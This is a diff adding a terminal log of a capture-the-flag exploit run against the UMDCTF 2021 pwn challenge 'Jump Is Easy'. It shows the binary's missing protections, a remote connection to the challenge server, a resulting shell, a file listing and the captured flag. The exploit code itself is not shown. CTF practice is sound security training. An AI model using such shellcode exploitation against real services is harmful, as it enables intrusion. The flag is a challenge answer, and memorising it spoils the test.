@@ -1,0 +1,23 @@
+mito@ubuntu:~/CTF/UMDCTF_2021/Pwn_Jump_Is_Easy_100$ python solve.py r
+[*] '/home/mito/CTF/UMDCTF_2021/Pwn_Jump_Is_Easy_100/JIE'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+[+] Opening connection to chals6.umdctf.io on port 7001: Done
+[*] Switching to interactive mode
+$ id
+/bin//sh: 1: id: not found
+$ ls -l
+total 44
+-rwxr-x--- 1 0 1000 16968 Apr 17 19:34 JIE
+drwxr-x--- 1 0 1000  4096 Apr 17 17:24 bin
+drwxr-x--- 1 0 1000  4096 Apr 17 17:24 dev
+-rwxr----- 1 0 1000    47 Apr 17 17:13 flag
+drwxr-x--- 1 0 1000  4096 Apr 17 17:23 lib
+drwxr-x--- 1 0 1000  4096 Apr 17 17:23 lib32
+drwxr-x--- 1 0 1000  4096 Apr 17 17:23 lib64
+$ cat flag
+UMDCTF-{Sh311c0d3_1s_The_B35T_p14c3_70_jump_70}$
